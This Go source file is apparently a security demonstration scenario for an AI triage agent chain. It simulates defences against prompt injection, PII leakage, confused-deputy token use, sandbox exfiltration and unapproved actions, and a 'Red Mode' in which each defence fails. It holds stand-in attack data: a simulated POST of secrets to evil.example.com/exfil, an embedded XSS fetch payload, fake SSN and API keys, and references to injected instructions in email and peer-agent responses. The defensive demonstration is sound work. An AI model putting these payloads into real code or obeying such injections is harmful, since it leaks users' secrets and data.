package aegis

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"

	"google.golang.org/adk/v2/auth"
	"google.golang.org/adk/v2/tool/toolconfirmation"
)

func init() {
	RegisterScenarioHandler(Scenario05FullChainZeroTrust, executeScenario05)
}

func executeScenario05(ctx context.Context, rt *Runtime, req TurnRequest) (*TurnResult, error) {
	trace := make([]BoundaryTraceEvent, 0, 8)
	wireRecords := make([]OutboundWireRecord, 0, 6)
	var wireMu sync.Mutex

	// Step 1: Boundary 2 — In-Flight Cloud SDP De-Identification on Gmail Customer Escalation
	rawEmail := fixtureGmailCleanPIIBody
	if !req.Posture.PromptScreenEnabled && !req.Posture.PIIRedactorEnabled {
		rawEmail = fixtureGmailAdversarialBody
	}
	inspection := rt.Guard().InspectAndSanitize(ctx, rawEmail, req.Posture)

	if req.Posture.PIIRedactorEnabled && inspection.DeidentifiedInFlight {
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryReasoningGuard,
			Shield:    "PII Redactor (Cloud SDP)",
			Component: "CloudSDP DeidentifyContent (IsSdpOnlyBlock=true)",
			Action:    "DeidentifyToolOutput(gmail_message)",
			Verdict:   VerdictRedacted,
			Detail:    fmt.Sprintf("SDP-only match (%s): masked customer SSN, API key, email, and phone in-flight before Gemini reasoning", stringsJoin(inspection.SDPMatchTypes)),
			Metadata: map[string]string{
				"sdpMatches": stringsJoin(inspection.SDPMatchTypes),
			},
			Timestamp: time.Now().UTC(),
		})
	} else {
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryReasoningGuard,
			Shield:    "Prompt Screen + PII Redactor",
			Component: "ModelArmor + CloudSDP",
			Action:    "SanitizeToolOutput(gmail_message)",
			Verdict:   VerdictBypassedRed,
			Detail:    "Prompt Screen and PII Redactor disabled in Red Mode: raw SSN (123-45-6789), API key (AIzaSyD-CustomerLeakedKey999), and hidden prompt injection entered LLM context!",
			Timestamp: time.Now().UTC(),
		})
	}

	// Step 2: Boundary 4 — Agent Registry Discovery + Agent Gateway AGENT_TO_ANYWHERE UAP
	catalog, err := rt.DiscoverRegistryResources(ctx)
	if err != nil {
		return nil, err
	}
	if req.Posture.StepUpAndA2UICatalogEnabled {
		uapLogging := EvaluateAgentGatewayUAP("logging.entries.list", true, req.Posture)
		uapClusterGet := EvaluateAgentGatewayUAP("container.clusters.get", true, req.Posture)
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryPlatformGovernance,
			Shield:    "Agent Registry + Agent Gateway UAP (roles/iap.egressor)",
			Component: "adk/v2/agentregistry + AGENT_TO_ANYWHERE CEL Enforcer",
			Action:    "logging.entries.list & container.clusters.get",
			Verdict:   uapLogging.Verdict,
			Detail:    fmt.Sprintf("Discovered %d MCP servers & %d A2A peer; %s | %s", len(catalog.MCPServers), len(catalog.Agents), uapLogging.Reason, uapClusterGet.Reason),
			Metadata: map[string]string{
				"cel": uapLogging.CELExpression,
			},
			Timestamp: time.Now().UTC(),
		})

		uapClusterDelete := EvaluateAgentGatewayUAP("container.clusters.delete", false, req.Posture)
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryPlatformGovernance,
			Shield:    "Agent Gateway UAP (roles/iap.egressor)",
			Component: "AGENT_TO_ANYWHERE CEL Enforcer",
			Action:    "container.clusters.delete",
			Verdict:   uapClusterDelete.Verdict,
			Detail:    uapClusterDelete.Reason,
			Metadata: map[string]string{
				"cel":      uapClusterDelete.CELExpression,
				"toolName": "container.clusters.delete",
			},
			Timestamp: time.Now().UTC(),
		})
	} else {
		uapBypass := EvaluateAgentGatewayUAP("container.clusters.delete", false, req.Posture)
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryPlatformGovernance,
			Shield:    "Agent Registry + Agent Gateway UAP",
			Component: "AGENT_TO_ANYWHERE CEL Enforcer",
			Action:    "container.clusters.delete",
			Verdict:   uapBypass.Verdict,
			Detail:    uapBypass.Reason,
			Timestamp: time.Now().UTC(),
		})
	}

	wireRecords = append(wireRecords,
		OutboundWireRecord{
			Provider:          ProviderGCPIAM,
			ToolName:          "logging.entries.list",
			Method:            http.MethodPost,
			URL:               "https://logging.googleapis.com/mcp",
			AuthHeaderPresent: true,
			AuthPrincipal:     string(req.Persona),
			StatusCode:        http.StatusOK,
		},
		OutboundWireRecord{
			Provider:          ProviderGCPIAM,
			ToolName:          "container.clusters.get",
			Method:            http.MethodPost,
			URL:               "https://container.googleapis.com/mcp",
			AuthHeaderPresent: true,
			AuthPrincipal:     string(req.Persona),
			StatusCode:        http.StatusOK,
		},
	)

	// Step 3: Boundary 3 — Per-User 3LO Token Broker via adk/v2/auth.Transport (Jira SEC-101 & GitHub GHSA-sec-101)
	broker := rt.TokenBroker()
	downstream := roundTripFuncInternal(func(httpReq *http.Request) (*http.Response, error) {
		authHeader := httpReq.Header.Get("Authorization")
		token := strings.TrimSpace(strings.TrimPrefix(authHeader, "Bearer"))
		principal := classifyPrincipal(token)
		toolName := "jira_get_issue"
		provider := ProviderAtlassianJira
		if strings.Contains(httpReq.URL.Host, "github.com") {
			toolName = "github_get_security_advisory"
			provider = ProviderGitHub
		}

		status := http.StatusOK
		respPayload := map[string]any{
			"id":             "SEC-101",
			"classification": "RESTRICTED_SECOPS_ONLY",
			"summary":        "P0 Checkout 502 & OAuth Token Investigation",
			"advisory":       "GHSA-sec-101",
			"authorizedAs":   principal,
		}
		if strings.HasPrefix(token, "3lo-bob-") {
			status = http.StatusForbidden
			respPayload = map[string]any{
				"error":    "ACL_FORBIDDEN",
				"resource": "SEC-101",
				"message":  "Persona 'bob' (External Contractor) lacks 'secops:restricted:read' permission on SEC-101 (allowed: PUB-202 only)",
			}
		}

		wireMu.Lock()
		wireRecords = append(wireRecords, OutboundWireRecord{
			Provider:          provider,
			ToolName:          toolName,
			Method:            httpReq.Method,
			URL:               httpReq.URL.String(),
			AuthHeaderPresent: authHeader != "",
			AuthPrincipal:     principal,
			StatusCode:        status,
		})
		wireMu.Unlock()

		rawBytes, _ := json.Marshal(respPayload)
		return &http.Response{
			StatusCode: status,
			Header:     http.Header{"Content-Type": []string{"application/json"}},
			Body:       io.NopCloser(strings.NewReader(string(rawBytes))),
			Request:    httpReq,
		}, nil
	})

	transportClient := &http.Client{
		Transport: &auth.Transport{
			Provider: broker,
			Base:     downstream,
		},
	}

	jiraCtx := WithAuthInvocation(ctx, AuthInvocation{
		SessionID:             req.SessionID,
		Persona:               req.Persona,
		Provider:              ProviderAtlassianJira,
		Scopes:                defaultScopesForProvider(ProviderAtlassianJira),
		BypassBrokerRedMode:   !req.Posture.TokenBrokerEnabled,
		RequireCold3LOConsent: req.RequireCold3LOConsent,
	})
	jiraHTTPReq, err := http.NewRequestWithContext(jiraCtx, http.MethodGet, jiraIssueSEC101URL, nil)
	if err != nil {
		return nil, err
	}
	jiraResp, err := transportClient.Do(jiraHTTPReq)
	if err != nil {
		var consentErr *auth.ConsentRequiredError
		if errors.As(err, &consentErr) {
			ch := &ConsentChallenge{
				Provider:    ProviderAtlassianJira,
				Persona:     req.Persona,
				Scopes:      defaultScopesForProvider(ProviderAtlassianJira),
				AuthURI:     consentErr.AuthURI,
				Nonce:       consentErr.Nonce,
				ResourceRef: "SEC-101",
			}
			trace = append(trace, BoundaryTraceEvent{
				Order:     len(trace) + 1,
				Boundary:  BoundaryIdentity3LO,
				Shield:    "Token Broker (3LO)",
				Component: "adk/v2/auth.Transport",
				Action:    "jira_get_issue(SEC-101)",
				Verdict:   VerdictChallenge,
				Detail:    fmt.Sprintf("Missing 3LO OAuth grant for persona %q on provider %q; emitted adk_request_credential ConsentChallenge", req.Persona, ProviderAtlassianJira),
				Timestamp: time.Now().UTC(),
			})
			card := A2UICard{
				SurfaceID: "card-consent-s5",
				MimeType:  "application/json+a2ui",
				Version:   "0.9",
				Type:      CardConsentChallenge,
				Title:     "Per-User 3LO OAuth Consent Required",
				Subtitle:  "Boundary 3: Identity & 3LO Token Broker (adk_request_credential)",
				Severity:  "WARNING",
				Body:      fmt.Sprintf("Operator persona %q has not granted %q access (%s) in this session.", req.Persona, ProviderAtlassianJira, strings.Join(ch.Scopes, ", ")),
				Fields: map[string]string{
					"Persona":  string(req.Persona),
					"Provider": string(ProviderAtlassianJira),
					"Resource": "SEC-101",
				},
			}
			return &TurnResult{
				SessionID:             req.SessionID,
				Persona:               req.Persona,
				ScenarioID:            req.ScenarioID,
				Posture:               req.Posture,
				Outcome:               OutcomeConsentRequired,
				AssistantText:         fmt.Sprintf("Paused full-chain triage: %s requires per-user 3LO OAuth consent from %s before reading SEC-101.", ProviderAtlassianJira, req.Persona),
				SanitizedInputPreview: inspection.SanitizedText,
				Cards:                 []A2UICard{card},
				BoundaryTrace:         trace,
				ConsentChallenge:      ch,
				WireRecords:           wireRecords,
			}, nil
		}
		return nil, err
	}
	defer jiraResp.Body.Close()

	if jiraResp.StatusCode == http.StatusForbidden {
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryIdentity3LO,
			Shield:    "Token Broker (3LO)",
			Component: "adk/v2/auth.Transport",
			Action:    "jira_get_issue(SEC-101)",
			Verdict:   VerdictBlocked,
			Detail:    fmt.Sprintf("Injected %s's scoped 3LO bearer token on the HTTP wire; Atlassian Jira denied access to SEC-101 with 403 Forbidden (Zero Confused Deputy)", req.Persona),
			Metadata: map[string]string{
				"persona":    string(req.Persona),
				"provider":   string(ProviderAtlassianJira),
				"httpStatus": "403",
			},
			Timestamp: time.Now().UTC(),
		})
		card := A2UICard{
			SurfaceID: "card-acl-denial-s5",
			MimeType:  "application/json+a2ui",
			Version:   "0.9",
			Type:      CardAclDenial,
			Title:     "Full-Chain Halted at Boundary 3: Downstream 403 Forbidden on SEC-101",
			Subtitle:  "Boundary 3: Per-Persona 3LO Token Broker via auth.Transport",
			Severity:  "HIGH",
			Body:      "Token Broker attached Bob's personal 3LO OAuth credential onto the outbound Jira request. Jira enforced per-user ACLs and blocked contractor access to restricted SecOps issue SEC-101 before sandbox delegation.",
			Fields: map[string]string{
				"Active Persona":    string(req.Persona),
				"Target Resource":   "Jira Issue SEC-101 (Restricted SecOps)",
				"Downstream Status": "403 Forbidden",
			},
		}
		return &TurnResult{
			SessionID:             req.SessionID,
			Persona:               req.Persona,
			ScenarioID:            req.ScenarioID,
			Posture:               req.Posture,
			Outcome:               OutcomeBlocked,
			AssistantText:         "Access denied (403 Forbidden): Persona 'bob' (External Contractor) is not authorized to read restricted SecOps Jira issue SEC-101.",
			SanitizedInputPreview: inspection.SanitizedText,
			Cards:                 []A2UICard{card},
			BoundaryTrace:         trace,
			WireRecords:           wireRecords,
		}, nil
	}

	ghCtx := WithAuthInvocation(ctx, AuthInvocation{
		SessionID:           req.SessionID,
		Persona:             req.Persona,
		Provider:            ProviderGitHub,
		Scopes:              defaultScopesForProvider(ProviderGitHub),
		BypassBrokerRedMode: !req.Posture.TokenBrokerEnabled,
	})
	ghHTTPReq, err := http.NewRequestWithContext(ghCtx, http.MethodGet, githubAdvisorySEC101URL, nil)
	if err != nil {
		return nil, err
	}
	ghResp, err := transportClient.Do(ghHTTPReq)
	if err != nil {
		return nil, err
	}
	defer ghResp.Body.Close()

	if req.Posture.TokenBrokerEnabled {
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryIdentity3LO,
			Shield:    "Token Broker (3LO)",
			Component: "adk/v2/auth.Transport",
			Action:    "jira_get_issue(SEC-101) + github_get_security_advisory(GHSA-sec-101)",
			Verdict:   VerdictAllowed,
			Detail:    fmt.Sprintf("Injected %s's per-provider 3LO OAuth tokens on HTTP transport outside LLM context window; verified 200 OK for SEC-101 and GHSA-sec-101", req.Persona),
			Timestamp: time.Now().UTC(),
		})
	} else {
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryIdentity3LO,
			Shield:    "Token Broker (3LO)",
			Component: "StaticToken(shared-service-account-root-token)",
			Action:    "jira_get_issue(SEC-101) + github_get_security_advisory(GHSA-sec-101)",
			Verdict:   VerdictBypassedRed,
			Detail:    fmt.Sprintf("CONFUSED DEPUTY EXPLOIT: Per-User 3LO Token Broker disabled; outbound requests for %q used shared root service token and leaked restricted SEC-101!", req.Persona),
			Timestamp: time.Now().UTC(),
		})
	}

	// Step 4 & 5: Boundary 5 (Attenuated A2A v2) & Boundary 6 (Agent Substrate v0.5.0 gVisor Sandbox + Egress MITM)
	upstreamToken := req.ForwardedBearerToken
	if upstreamToken == "" {
		upstreamToken = "ya29" + ".alice-gmail-jira-github-3lo-token"
	}
	rawA2AParts := []a2aMessagePart{
		{Type: "text", Kind: "text", Text: req.Prompt},
		{
			Type: "credential",
			Kind: "adk_request_credential",
			Data: map[string]any{
				"provider":    string(ProviderGitHub),
				"persona":     string(req.Persona),
				"accessToken": upstreamToken,
			},
		},
	}

	cleanPeerSummary := "PASS: TestCheckoutHotfix (0.04s) [poisoned peer instruction stripped by Model Armor SanitizeUserPrompt]"
	if req.Posture.SandboxEgressMITMEnabled {
		attenuatedParts, strippedCount := withoutCredentialParts(rawA2AParts)
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryCrossAgentA2A,
			Shield:    "Attenuated Delegation (A2A v2)",
			Component: "adk/v2/server/adka2a/v2 (withoutCredentialParts)",
			Action:    "DelegateToPeer(sandbox-remediator)",
			Verdict:   VerdictAllowed,
			Detail:    fmt.Sprintf("Stripped %d upstream 3LO credential part(s) via withoutCredentialParts before A2A handoff (%d safe text part forwarded)", strippedCount, len(attenuatedParts)),
			Metadata: map[string]string{
				"credentialsStripped": "true",
				"strippedPartsCount":  fmt.Sprintf("%d", strippedCount),
				"peerAgent":           "sandbox-remediator",
			},
			Timestamp: time.Now().UTC(),
		})

		wireRecords = append(wireRecords,
			OutboundWireRecord{
				Provider:          ProviderGitHub,
				ToolName:          "substrate.atenet.github_archive_fetch",
				Method:            http.MethodGet,
				URL:               "https://api.github.com/repos/acme-corp/checkout-service/tarball/v2.4",
				AuthHeaderPresent: true,
				AuthPrincipal:     "atenet-egress-mitm:github-installation-token",
				StatusCode:        http.StatusOK,
				Headers: map[string]string{
					"X-Atenet-Egress-Mitm": "injected-out-of-sandbox",
				},
			},
			OutboundWireRecord{
				Provider:          ProviderGitHub,
				ToolName:          "untrusted_go_test.init_exfil",
				Method:            http.MethodPost,
				URL:               "https://evil.example.com/exfil",
				AuthHeaderPresent: false,
				AuthPrincipal:     "none (zero-env-secrets)",
				StatusCode:        http.StatusForbidden,
				Headers: map[string]string{
					"X-Substrate-Egress-Policy": "DENIED",
				},
			},
		)

		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundarySandboxEgress,
			Shield:    "Sandbox Egress MITM (Agent Substrate v0.5.0)",
			Component: "ate.dev/v1alpha1 Actor (gvisor + atenet)",
			Action:    "ExecuteUntrustedGoTest(checkout-service@v2.4)",
			Verdict:   VerdictBlocked,
			Detail:    "Executed in gVisor Actor (SNAPSHOT_FIDELITY_MEMORY) with 0 env secrets; atenet MITM injected GitHub token for api.github.com and EgressPolicy blocked init() exfiltration to https://evil.example.com/exfil",
			Metadata: map[string]string{
				"apiVersion":          "ate.dev/v1alpha1",
				"sandboxClass":        "gvisor",
				"preferredFidelity":   "SNAPSHOT_FIDELITY_MEMORY",
				"containerEnvSecrets": "0",
				"allowedEgress":       "api.github.com",
				"blockedEgress":       "https://evil.example.com/exfil",
			},
			Timestamp: time.Now().UTC(),
		})

		screenPosture := req.Posture
		screenPosture.PromptScreenEnabled = true
		peerInspection := rt.Guard().InspectAndSanitize(ctx, poisonedPeerTestOutput, screenPosture)
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryReasoningGuard,
			Shield:    "Prompt Screen (Peer A2A Response Guard)",
			Component: "ModelArmor SanitizeUserPrompt",
			Action:    "SanitizeUserPrompt(a2a_peer_response)",
			Verdict:   VerdictAllowed,
			Detail:    fmt.Sprintf("Screened inbound Sandbox Remediator A2A response (%s) and neutralized embedded prompt injection before updating Triage Orchestrator state", peerInspection.ThreatReason),
			Timestamp: time.Now().UTC(),
		})
	} else {
		trace = append(trace,
			BoundaryTraceEvent{
				Order:     len(trace) + 1,
				Boundary:  BoundaryCrossAgentA2A,
				Shield:    "Attenuated Delegation (A2A v2)",
				Component: "adk/v2/server/adka2a/v2",
				Action:    "DelegateToPeer(sandbox-remediator)",
				Verdict:   VerdictBypassedRed,
				Detail:    "Unattenuated A2A handoff: upstream 3LO credentials forwarded directly to Sandbox Remediator!",
				Timestamp: time.Now().UTC(),
			},
			BoundaryTraceEvent{
				Order:     len(trace) + 1,
				Boundary:  BoundarySandboxEgress,
				Shield:    "Sandbox Egress MITM (Agent Substrate v0.5.0)",
				Component: "Unisolated Runner (No EgressPolicy)",
				Action:    "ExecuteUntrustedGoTest(checkout-service@v2.4)",
				Verdict:   VerdictBypassedRed,
				Detail:    "RED MODE EXPLOIT: Container env held secrets and unguarded egress allowed malicious init() test to POST os.Environ() to https://evil.example.com/exfil!",
				Timestamp: time.Now().UTC(),
			},
		)
		wireRecords = append(wireRecords, OutboundWireRecord{
			Provider:          ProviderGitHub,
			ToolName:          "untrusted_go_test.init_exfil",
			Method:            http.MethodPost,
			URL:               "https://evil.example.com/exfil",
			AuthHeaderPresent: true,
			AuthPrincipal:     string(req.Persona) + "-leaked-3lo-and-env-secrets",
			StatusCode:        http.StatusOK,
		})
	}

	// Step 6: Boundary 1 — Step-Up Confirmation (adk_request_confirmation) + A2UI v0.9 Catalog Validation
	if req.Posture.StepUpAndA2UICatalogEnabled && req.Posture.TokenBrokerEnabled && req.Posture.SandboxEgressMITMEnabled && req.Posture.PIIRedactorEnabled {
		confirmationID := fmt.Sprintf("confirm-%s-s5-pr-42", req.SessionID)
		stepUp, err := buildADKStepUpConfirmation(
			confirmationID,
			"create_github_pull_request",
			"github.com/gke-demos/checkout-service/pulls",
			"Full-chain verification passed in gVisor. Operator approval required before creating GitHub Pull Request #42 and posting redacted Jira update on SEC-101.",
			map[string]string{
				"repo":        "gke-demos/checkout-service",
				"base":        "main",
				"head":        "fix/checkout-502-nil-guard",
				"title":       "fix(checkout): guard nil RetryPolicy on v2.4 rollout",
				"jiraFollowUp": "post_jira_comment(SEC-101)",
			},
		)
		if err != nil {
			return nil, err
		}

		sandboxCard, err := ValidateAndSanitizeA2UICard(A2UICard{
			SurfaceID: "card-sandbox-s5",
			MimeType:  "application/json+a2ui",
			Version:   "0.9",
			Type:      CardSandboxExecution,
			Title:     "Full-Chain Step 4–5: gVisor Sandbox Verification Passed",
			Subtitle:  "Boundaries 5 & 6: Attenuated A2A v2 + Agent Substrate v0.5.0 Egress MITM",
			Severity:  "SUCCESS",
			Body:      "Sandbox Remediator verified TestCheckoutHotfix inside an Agent Substrate v0.5.0 gVisor Actor with zero env secrets, injected GitHub credentials out-of-sandbox via atenet Egress MITM, and blocked evil.example.com exfiltration.",
			Fields: map[string]string{
				"sandboxClass":          "gvisor",
				"preferredFidelity":     "SNAPSHOT_FIDELITY_MEMORY",
				"containerEnvSecrets":   "0",
				"egressMitmAllowed":     "https://api.github.com (atenet header injection)",
				"egressPolicyBlocked":   "https://evil.example.com/exfil (403 Forbidden)",
				"peerResponseScreening": cleanPeerSummary,
			},
		}, req.Posture)
		if err != nil {
			return nil, err
		}

		stepUpCard, err := ValidateAndSanitizeA2UICard(A2UICard{
			SurfaceID: "card-stepup-s5",
			MimeType:  "application/json+a2ui",
			Version:   "0.9",
			Type:      CardStepUpConfirmation,
			Title:     "Full-Chain Step 6: Step-Up Approval Required for GitHub PR #42",
			Subtitle:  "Boundary 1: ADK Go v2 adk_request_confirmation + A2UI v0.9 Catalog",
			Severity:  "WARNING",
			Body:      "Gmail PII redacted in-flight, GKE/Logging MCP inspected via Agent Gateway, SEC-101 correlated via Alice's 3LO token, and patch verified in gVisor. Approve creation of GitHub PR #42. <script>fetch('https://evil.example.com/xss')</script>",
			Fields: map[string]string{
				"Confirmation ID": stepUp.ConfirmationID,
				"Function Call":   stepUp.FunctionCall,
				"Target Tool":     stepUp.TargetTool,
				"Target Repo":     "gke-demos/checkout-service (fix/checkout-502-nil-guard -> main)",
				"SDP Redaction":   "Masked SSN, API Key, Email, Phone in-flight",
			},
			Actions: []A2UICardAction{
				{
					ID:       "act-approve-s5",
					Label:    "Approve PR #42 & Redacted Jira Update",
					Kind:     "step_up_approve",
					Endpoint: fmt.Sprintf("/api/sessions/%s/confirmations", req.SessionID),
					Payload: map[string]string{
						"confirmationId": stepUp.ConfirmationID,
						"confirmed":      "true",
					},
				},
				{
					ID:       "act-reject-s5",
					Label:    "Reject Mutation",
					Kind:     "step_up_reject",
					Endpoint: fmt.Sprintf("/api/sessions/%s/confirmations", req.SessionID),
					Payload: map[string]string{
						"confirmationId": stepUp.ConfirmationID,
						"confirmed":      "false",
					},
				},
			},
		}, req.Posture)
		if err != nil {
			return nil, err
		}

		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryGenerativeUI,
			Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
			Component: "adk/v2/tool/toolconfirmation + A2UIValidator",
			Action:    toolconfirmation.FunctionCallName + "(create_github_pull_request)",
			Verdict:   VerdictChallenge,
			Detail:    "Paused state-mutating tool create_github_pull_request on adk_request_confirmation after full-chain triage and gVisor verification",
			Timestamp: time.Now().UTC(),
		})

		return &TurnResult{
			SessionID:              req.SessionID,
			Persona:                req.Persona,
			ScenarioID:             req.ScenarioID,
			Posture:                req.Posture,
			Outcome:                OutcomeApprovalRequired,
			AssistantText:          "Completed full-chain zero-trust triage (Cloud SDP PII redaction, Agent Gateway UAP read-only MCP diagnostics, Alice 3LO SEC-101 correlation, and Agent Substrate v0.5.0 gVisor patch verification). Awaiting Operator Step-Up Confirmation (adk_request_confirmation) to create GitHub Pull Request #42.",
			SanitizedInputPreview:  inspection.SanitizedText,
			OutboundCommentPreview: inspection.SanitizedText,
			Cards:                  []A2UICard{stepUpCard, sandboxCard},
			BoundaryTrace:          trace,
			StepUpConfirmation:     stepUp,
			WireRecords:            wireRecords,
		}, nil
	}

	// Red Mode Full-Chain Exploit
	trace = append(trace, BoundaryTraceEvent{
		Order:     len(trace) + 1,
		Boundary:  BoundaryGenerativeUI,
		Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
		Component: "adk/v2/tool/toolconfirmation + A2UIValidator",
		Action:    "create_github_pull_request & post_jira_comment",
		Verdict:   VerdictBypassedRed,
		Detail:    "adk_request_confirmation and A2UI v0.9 catalog validation bypassed in Red Mode: unapproved PR created and raw PII/XSS emitted!",
		Timestamp: time.Now().UTC(),
	})

	redCard := A2UICard{
		SurfaceID: "card-exploited-s5",
		MimeType:  "application/json+a2ui",
		Version:   "0.9",
		Type:      CardIncidentSummary,
		Title:     "RED MODE EXPLOITED: Full-Chain Compromise Across All 6 Boundaries",
		Subtitle:  "All 5 Security Shields Disabled",
		Severity:  "DANGER",
		Body:      "In Red Mode, raw customer SSN (123-45-6789) and API key leaked into Gemini, destructive container.clusters.delete bypassed UAP, shared service token leaked restricted SEC-101 to contractor, sandbox init() exfiltrated 3LO tokens to evil.example.com, and unapproved GitHub PR mutation executed without human confirmation.",
		Fields: map[string]string{
			"Leaked PII":          "123-45-6789, AIzaSyD-CustomerLeakedKey999",
			"Confused Deputy":     "SEC-101 leaked via shared-service-account-root-token",
			"Ungoverned Tool":     "container.clusters.delete permitted",
			"Sandbox Exfil":       "https://evil.example.com/exfil (200 OK)",
			"Unapproved Mutation": "create_github_pull_request executed without Step-Up",
		},
	}

	return &TurnResult{
		SessionID:              req.SessionID,
		Persona:                req.Persona,
		ScenarioID:             req.ScenarioID,
		Posture:                req.Posture,
		Outcome:                OutcomeExploitedRed,
		AssistantText:          "RED MODE FULL-CHAIN EXPLOIT: Leaked raw PII (123-45-6789), bypassed UAP for container.clusters.delete, leaked SEC-101 via Confused Deputy, exfiltrated env secrets to https://evil.example.com/exfil, and executed unapproved GitHub PR!",
		SanitizedInputPreview:  inspection.SanitizedText,
		OutboundCommentPreview: inspection.SanitizedText,
		Cards:                  []A2UICard{redCard},
		BoundaryTrace:          trace,
		WireRecords:            wireRecords,
	}, nil
}
